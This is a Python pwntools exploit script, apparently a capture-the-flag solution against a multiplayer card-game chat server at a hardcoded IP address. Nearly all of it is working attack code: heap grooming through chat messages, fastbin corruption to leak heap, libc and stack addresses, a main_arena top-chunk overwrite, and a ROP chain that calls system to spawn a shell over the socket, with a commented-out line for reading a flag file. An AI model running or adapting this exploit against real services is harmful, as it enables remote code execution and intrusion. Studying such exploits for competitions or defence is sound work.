#!/usr/bin/env python

from pwn import *
context.arch = 'amd64'

#IP = 'localhost'
IP = '52.68.31.117'
if len(sys.argv) > 1:
    PORT = int(sys.argv[1])
else:
    PORT = 5566

def flush(r):
    while r.can_recv():
        r.recv()

def add(r, tid, content, n=0):
    if n == 0:
        n = len(content)
    r.sendline('/msg ' + str(tid) + ' ' + str(n))
    r.recvuntil('msg: ')
    r.send(content)
    r.recvuntil('Told')

def de(r, mid):
    r.sendline('/del ' + str(mid))
    r.recvuntil('Success')

def control(ni, p):
    s = flat('controller'.ljust(0x80, '\x00'), 
        0, 0x31,
        ni, # next
        p,  # str
        'mehqq'.ljust(0x10, '\x00')
        )
    return s

sock = []
uid = []
id1 = 0
def startup():
    global sock
    global uid
    global id1
    sock = []
    uid = []
    id1 = 0

    p = log.progress('Attempt exploit')
    p.status('Arrange heap ...')

    # initial sockets
    for i in range(5):
        r = remote(IP, PORT)
        sock.append(r)
        r.recvuntil('?\n')
        r.sendline('meh' + str(i))
        r.recvuntil(':)\n')
        r.sendline('/whoami')
        r.recvuntil('Player ')
        s = r.recvuntil(' ')
        n = int(s)
        uid.append(n)

    # arrange heap
    for i in range(1,3):
        # prepare chunks for nodes
        for j in range(5):
            add(sock[i], uid[i+2], 'a'*0x28)

        # the chunk to be overflowed
        add(sock[i], uid[i+2], 'overflow here '.ljust(0x18, 'x'))

        # release chunk for node
        #sock[i].interactive()
        de(sock[i], 0)
        sock[i+2].recv()
        de(sock[i+2], 0)

        # the chunk that size will be shrink
        add(sock[i], uid[i+2], 'shrink me '.ljust(0x1e0, 'x'))

        # the chunk to do unlink
        add(sock[i], uid[i+2], 'big chunk to unlink'.ljust(0xf0))

        # a chunk to prevent merge to top chunk
        add(sock[i], uid[i+2], 'padding '.ljust(0x30, 'x'))

        # free the chunk to be shrinked
        de(sock[i], 5)
        de(sock[i+2], 5)

        # free the chunk to be overflowed
        de(sock[i], 4)
        de(sock[i+2], 4)

        # arrange fastbin
        de(sock[i], 5)
        de(sock[i+2], 5)
        add(sock[i], uid[i+2], ''.ljust(0x28, 'x'))

    flush(sock[1])
    # start game
    sock[1].sendline('/create')
    s = sock[1].recvuntil('\n', drop = True)
    rid = int(s.split(' ')[6][:-1])
    for i in range(2, 5):
        flush(sock[i])
        sock[i].sendline('/join ' + str(rid))
        sock[i].recvuntil('meh' + str(i))
    sock[1].recvuntil('4 players')
    sock[1].sendline('/start')

    p.status('Playing game')
    flag = False
    slap = False
    for i in range(1, 5):
        sock[i].recvuntil('You!')
        sock[i].sendline('')
        while True:
            s = sock[i].recv()
            if ((i == 1) and ('A|' in s)):
                slap = True
                break
            if ((i == 2) and ('2|' in s)):
                slap = True
                break
            if ((i == 3) and ('3|' in s)):
                slap = True
                break
            if ((i == 4) and ('4|' in s)):
                slap = True
                break
            if 'Diamonds  10' in s:
                flag = True
                break
            if 'Turn to' in s:
                break
        if flag:
            id1 = i
            for j in range(1,5):
                if j != i:
                    sock[j].close()
            p.success('Exploit success')
            return True
        if slap:
            break
    for i in range(5):
        sock[i].close()
    p.failure('failed')
    return False

while not startup():
    pass

# do leak
r1 = sock[id1]
r2 = sock[0]
id2 = uid[0]
add(r1, id2, 'mehqq '.ljust(0x80))
add(r1, id2, ''.ljust(0x30, 'x'))
de(r1, 6)
de(r1, 4)
add(r1, id2, 'mehqq '.ljust(0x80))

r1.sendline('/log')
r1.recvuntil('x\n')
r1.recvline()
s = r1.recvline()
n = (int(s.split(' ')[2][:-1]))
heap_base = u64(s.split(' ')[3].ljust(8, '\x00')) - 0x2c0
if n < 0:
    n += 2**32
print 'heap', hex(heap_base)

# clear this session
r2.close()
r1.close()

while not startup():
    pass

r1 = sock[id1]
r2 = sock[0]
id2 = uid[0]
add(r1, id2, 'mehqq '.ljust(0x80))
add(r1, id2, ''.ljust(0x30, 'x'))
de(r1, 6)
de(r1, 4)
s = flat('controller'.ljust(0x80), 
    0, 0x31,
    heap_base + 0x40,  # next
    heap_base + 0x300,  # str
    'mehqq'.ljust(0x10, '\x00')
    )


add(r1, id2, s)

r1.sendline('/log')
r1.recvuntil('mehqq')
s = r1.recvline()

arena = 0x3c3b20
env_off = 0x3c5f98
unsort = arena + 0x58
libc_base = u64(s.split(' ')[2][:-1].ljust(8, '\x00')) - unsort
env = libc_base + env_off
print 'libc', hex(libc_base)
add(r1, id2, 'i'*0x50)
add(r1, id2, 'j'*0x50)
de(r1, 6)

ni = heap_base + 0x40

add(r1, id2, control(ni, env))
r1.sendline('/log')
r1.recvuntil('mehqq : ')
s = r1.recvuntil('\n', drop=True)
stack_ptr = u64(s.ljust(8, '\x00'))
print 'stack', hex(stack_ptr)
fake_top = stack_ptr - 0x670
de(r1, 6)

# corrupt 0x60 fastbin
# free 0x60
add(r1, id2, control(ni, heap_base + 0x300))
de(r1, 5)
add(r1, id2, 'x'*0x40)
# free 0x60
de(r1, 5)
add(r1, id2, control(ni, heap_base + 0x390))
de(r1, 5)
add(r1, id2, 'x'*0x40)
# free 0x60
de(r1, 5)
add(r1, id2, control(ni, heap_base + 0x300))
de(r1, 5)
add(r1, id2, 'h'*0x40)

# release some node chunk
de(r1, 0)
de(r1, 0)
# left 0x51 in fastbin
add(r1, id2, p64(0x51).ljust(0x50, '\x00'))
add(r1, id2, 'x'*0x50)
add(r1, id2, 'x'*0x50)

# corrupt 0x50 fastbin
# free 0x50
de(r1, 3)
add(r1, id2, control(ni, heap_base + 0x3f0))
de(r1, 3)
add(r1, id2, 'h'*0x70)
# free 0x50
de(r1, 3)
add(r1, id2, control(ni, heap_base + 0x440))
de(r1, 3)
add(r1, id2, 'h'*0x70)
# free 0x50
de(r1, 3)
add(r1, id2, control(ni, heap_base + 0x3f0))
de(r1, 3)
add(r1, id2, 'h'*0x70)

fast = arena + 0x20

system = libc_base + 0x45380
pop_rdi = libc_base + 0x21102
de(r1, 0)
de(r1, 0)
# make fastbin fd point into main_arena
add(r1, id2, p64(libc_base + fast).ljust(0x40))
cmd = 'sh <&4 >&4'
#cmd = 'cat /home/HeartAttack/flag >&4'
cmd += '\0'
add(r1, id2, cmd.ljust(0x40,'\x00'))
add(r1, id2, 'x'*0x40)

# Now we malloc a chunk in main_arena
# overwrite top chunk addr to return address
s = flat(
    0, 0, 0, 0, 0,  # fastbin
    fake_top-8,     # top chunk
    0,              # last remainder
    libc_base + unsort, libc_base + unsort # clear unsortbin
        )
add(r1, id2, s)


rop = flat(
    pop_rdi,
    heap_base + 0x440,
    system
        )

add(r1, id2, rop.ljust(0x100, 'a'))

r1.recvline()
r1.interactive()
